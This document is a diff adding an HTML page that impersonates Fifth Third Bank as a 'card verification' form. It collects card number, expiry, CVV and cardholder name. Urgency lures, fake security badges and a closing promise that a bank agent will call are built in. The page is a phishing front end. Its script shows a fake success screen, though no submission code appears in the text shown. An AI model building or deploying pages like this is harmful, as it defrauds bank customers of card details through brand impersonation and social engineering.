@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fifth Third Bank - Card Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f5ff, #e6f0ff);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 12px 30px rgba(0, 45, 114, 0.15);
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #e0e7ff;
+        }
+        
+        .header {
+            background: #002D72;
+            color: white;
+            padding: 30px 30px 25px;
+            position: relative;
+            text-align: center;
+            border-bottom: 4px solid #E2001A;
+        }
+        
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .logo {
+            height: 70px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+        
+        .header-title {
+            font-size: 20px;
+            font-weight: 500;
+            margin-top: 5px;
+            opacity: 0.9;
+            letter-spacing: 0.5px;
+        }
+        
+        .security-badge {
+            background: linear-gradient(to right, #2ecc71, #27ae60);
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            margin-top: 15px;
+        }
+        
+        .content {
+            padding: 35px;
+        }
+        
+        .verification-alert {
+            background: #fff8e6;
+            border-left: 4px solid #ffc107;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            display: flex;
+            gap: 15px;
+        }
+        
+        .verification-alert i {
+            color: #ffc107;
+            font-size: 24px;
+            min-width: 30px;
+        }
+        
+        .verification-text {
+            flex: 1;
+        }
+        
+        .verification-text h3 {
+            color: #002D72;
+            margin-bottom: 8px;
+        }
+        
+        .verification-text p {
+            color: #5a6a8c;
+            line-height: 1.6;
+            font-size: 15px;
+        }
+        
+        .transaction-info {
+            background: #f8faff;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid #e0e7ff;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px dashed #e0e7ff;
+        }
+        
+        .info-row:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .info-label {
+            color: #5a6a8c;
+            font-weight: 500;
+        }
+        
+        .info-value {
+            color: #002D72;
+            font-weight: 600;
+        }
+        
+        .title {
+            font-size: 24px;
+            color: #002D72;
+            margin-bottom: 5px;
+            font-weight: 600;
+            text-align: center;
+        }
+        
+        .subtitle {
+            color: #6b7280;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #374151;
+            font-size: 15px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f9fafb;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+            color: #002D72;
+            font-weight: 500;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #002D72;
+            box-shadow: 0 0 0 3px rgba(0, 45, 114, 0.2), inset 0 2px 4px rgba(0,0,0,0.05);
+            background: #fff;
+        }
+        
+        .input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+            font-size: 18px;
+        }
+        
+        .row {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .col {
+            flex: 1;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, #002D72, #0044aa);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 6px 15px rgba(0, 45, 114, 0.3);
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(to right, #0044aa, #002D72);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 45, 114, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn i {
+            margin-right: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 25px;
+            background: #f3f4f6;
+            color: #6b7280;
+            font-size: 14px;
+            border-top: 1px solid #e5e7eb;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #002D72;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: #E2001A;
+        }
+        
+        .security-features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .security-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #5a6a8c;
+        }
+        
+        .processing {
+            display: none;
+            text-align: center;
+            padding: 50px 30px;
+            background: #fff;
+        }
+        
+        .processing-icon {
+            font-size: 72px;
+            color: #002D72;
+            margin-bottom: 30px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .processing h2 {
+            font-size: 28px;
+            color: #002D72;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .processing p {
+            color: #6b7280;
+            line-height: 1.7;
+            margin-bottom: 25px;
+            font-size: 16px;
+            max-width: 450px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .loading-bar {
+            height: 8px;
+            background: #e0e7ff;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 40px 0 30px;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #002D72, #E2001A);
+            border-radius: 4px;
+            animation: loading 2s infinite;
+        }
+        
+        .card-icons {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+            justify-content: center;
+        }
+        
+        .card-icon {
+            width: 60px;
+            height: 40px;
+            background: #f3f4f6;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6b7280;
+            font-size: 24px;
+            border: 1px solid #e5e7eb;
+        }
+        
+        .card-icon.active {
+            background: #fff;
+            border-color: #002D72;
+            color: #002D72;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .disclaimer {
+            background: #f8faff;
+            padding: 18px;
+            border-radius: 12px;
+            border: 1px solid #e0e7ff;
+            margin-top: 25px;
+            font-size: 14px;
+            color: #5a6a8c;
+            text-align: center;
+            line-height: 1.6;
+        }
+        
+        .disclaimer i {
+            color: #E2001A;
+            margin-right: 8px;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; left: 0; }
+            50% { width: 70%; }
+            100% { width: 100%; left: 100%; }
+        }
+        
+        @media (max-width: 520px) {
+            .row {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .header {
+                padding: 25px 20px;
+            }
+            
+            .content {
+                padding: 25px 20px;
+            }
+            
+            .title {
+                font-size: 22px;
+            }
+            
+            .logo {
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://i.postimg.cc/QtrtxPq1/OIP-1-removebg-preview.png" alt="Fifth Third Bank Logo" class="logo">
+            </div>
+            <div class="header-title">Card Verification Required</div>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>Secure Encrypted Connection</span>
+            </div>
+        </div>
+        
+        <div class="content" id="form-content">
+            <div class="verification-alert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div class="verification-text">
+                    <h3>Immediate Action Required</h3>
+                    <p>To prevent cancellation of your payment card, please verify your account details below. This mandatory security step must be completed within 24 hours to maintain card functionality.</p>
+                </div>
+            </div>
+            
+            <div class="transaction-info">
+                <div class="info-row">
+                    <span class="info-label">Verification ID:</span>
+                    <span class="info-value">FTB-VRF-20250717</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Initiated Date:</span>
+                    <span class="info-value">July 17, 2025</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Card Status:</span>
+                    <span class="info-value" style="color:#E2001A;">Verification Required</span>
+                </div>
+            </div>
+            
+            <h1 class="title">Verify Your Payment Card</h1>
+            <p class="subtitle">Enter your card details to complete verification and prevent cancellation</p>
+            
+            <form id="payment-form">
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <div class="input-group">
+                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
+                        <i class="fas fa-credit-card input-icon"></i>
+                    </div>
+                </div>
+                
+                <div class="row">
+                    <div class="col">
+                        <div class="form-group">
+                            <label for="expiry">Expiry Date</label>
+                            <div class="input-group">
+                                <input type="text" id="expiry" placeholder="MM/YY">
+                                <i class="far fa-calendar input-icon"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col">
+                        <div class="form-group">
+                            <label for="cvv">Security Code (CVV)</label>
+                            <div class="input-group">
+                                <input type="password" id="cvv" placeholder="•••" maxlength="3">
+                                <i class="fas fa-lock input-icon"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="card-name">Cardholder Name</label>
+                    <div class="input-group">
+                        <input type="text" id="card-name" placeholder="As shown on card">
+                        <i class="fas fa-user input-icon"></i>
+                    </div>
+                </div>
+                
+                <div class="card-icons">
+                    <div class="card-icon active"><i class="fab fa-cc-visa"></i></div>
+                    <div class="card-icon"><i class="fab fa-cc-mastercard"></i></div>
+                    <div class="card-icon"><i class="fab fa-cc-amex"></i></div>
+                    <div class="card-icon"><i class="fab fa-cc-discover"></i></div>
+                </div>
+                
+                <button type="submit" class="btn">
+                    <i class="fas fa-shield-alt"></i> Verify Card Now
+                </button>
+                
+                <div class="disclaimer">
+                    <i class="fas fa-info-circle"></i> Fifth Third Bank uses industry-standard encryption to protect your information. Your card details are never stored on our servers.
+                </div>
+            </form>
+        </div>
+        
+        <div class="processing" id="processing">
+            <div class="processing-icon">
+                <i class="fas fa-shield-check"></i>
+            </div>
+            <h2>Verification in Progress</h2>
+            <p>We're confirming your card details with our secure verification system. This may take a moment.</p>
+            
+            <div class="loading-bar">
+                <div class="loading-progress"></div>
+            </div>
+            
+            <p><strong>Important Notice:</strong> For security purposes, please allow up to 24 hours for a Fifth Third Bank support agent to contact you regarding your verification.</p>
+            <p>Your card will remain active during this process. Do not close this window or refresh the page.</p>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-shield-alt"></i> Security Center</a>
+                <a href="#"><i class="fas fa-lock"></i> Privacy Policy</a>
+                <a href="#"><i class="fas fa-file-contract"></i> Terms of Service</a>
+                <a href="#"><i class="fas fa-headset"></i> Contact Support</a>
+            </div>
+            <p>© 2025 Fifth Third Bank. All rights reserved. Member FDIC. Equal Housing Lender.</p>
+            <div class="security-features">
+                <div class="security-item">
+                    <i class="fas fa-user-shield"></i>
+                    <span>Fraud Protection</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-check-double"></i>
+                    <span>PCI DSS Compliant</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-badge-check"></i>
+                    <span>FDIC Insured</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const cardNumber = document.getElementById('card-number').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardName = document.getElementById('card-name').value;
+            
+            // Simple validation
+            if (!cardNumber || !expiry || !cvv || !cardName) {
+                showError('Please fill in all required fields');
+                return;
+            }
+            
+            if (cardNumber.replace(/\s/g, '').length !== 16) {
+                showError('Please enter a valid 16-digit card number');
+                return;
+            }
+            
+            if (cvv.length !== 3) {
+                showError('Please enter a valid 3-digit CVV');
+                return;
+            }
+            
+            // Show processing screen
+            document.getElementById('form-content').style.display = 'none';
+            document.getElementById('processing').style.display = 'block';
+            
+            // Simulate processing delay
+            setTimeout(function() {
+                document.querySelector('.processing-icon').innerHTML = '<i class="fas fa-check-circle"></i>';
+                document.querySelector('.processing-icon').style.color = '#27ae60';
+                document.querySelector('.processing h2').textContent = 'Verification Submitted';
+                document.querySelector('.processing p:first-of-type').innerHTML = 'Your card verification request has been successfully processed.';
+                document.querySelector('.processing p:nth-of-type(2)').innerHTML = '<strong>Important Notice:</strong> A Fifth Third Bank support agent will contact you within 24 hours to confirm your verification. Your card will remain active during this process.';
+            }, 4000);
+        });
+        
+        function showError(message) {
+            const errorEl = document.createElement('div');
+            errorEl.className = 'error-message';
+            errorEl.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+            errorEl.style.background = '#fff0f0';
+            errorEl.style.color = '#e53e3e';
+            errorEl.style.padding = '15px';
+            errorEl.style.borderRadius = '10px';
+            errorEl.style.marginBottom = '20px';
+            errorEl.style.border = '1px solid #fc8181';
+            errorEl.style.display = 'flex';
+            errorEl.style.alignItems = 'center';
+            errorEl.style.gap = '10px';
+            errorEl.style.animation = 'fadeIn 0.3s ease';
+            
+            const form = document.getElementById('payment-form');
+            form.parentNode.insertBefore(errorEl, form);
+            
+            setTimeout(() => {
+                errorEl.style.opacity = '0';
+                setTimeout(() => errorEl.remove(), 500);
+            }, 4000);
+        }
+        
+        // Format card number input
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            
+            e.target.value = formatted.substring(0, 19);
+        });
+        
+        // Format expiry date input
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            
+            e.target.value = value.substring(0, 5);
+        });
+        
+        // Card type detection
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            const value = e.target.value.replace(/\s/g, '');
+            const cardIcons = document.querySelectorAll('.card-icon');
+            
+            // Remove active class from all icons
+            cardIcons.forEach(icon => icon.classList.remove('active'));
+            
+            // Detect card type based on starting digits
+            if (/^4/.test(value)) {
+                cardIcons[0].classList.add('active'); // Visa
+            } else if (/^5[1-5]/.test(value)) {
+                cardIcons[1].classList.add('active'); // Mastercard
+            } else if (/^3[47]/.test(value)) {
+                cardIcons[2].classList.add('active'); // Amex
+            } else if (/^6(?:011|5)/.test(value)) {
+                cardIcons[3].classList.add('active'); // Discover
+            }
+        });
+    </script>
+</body>
+</html>
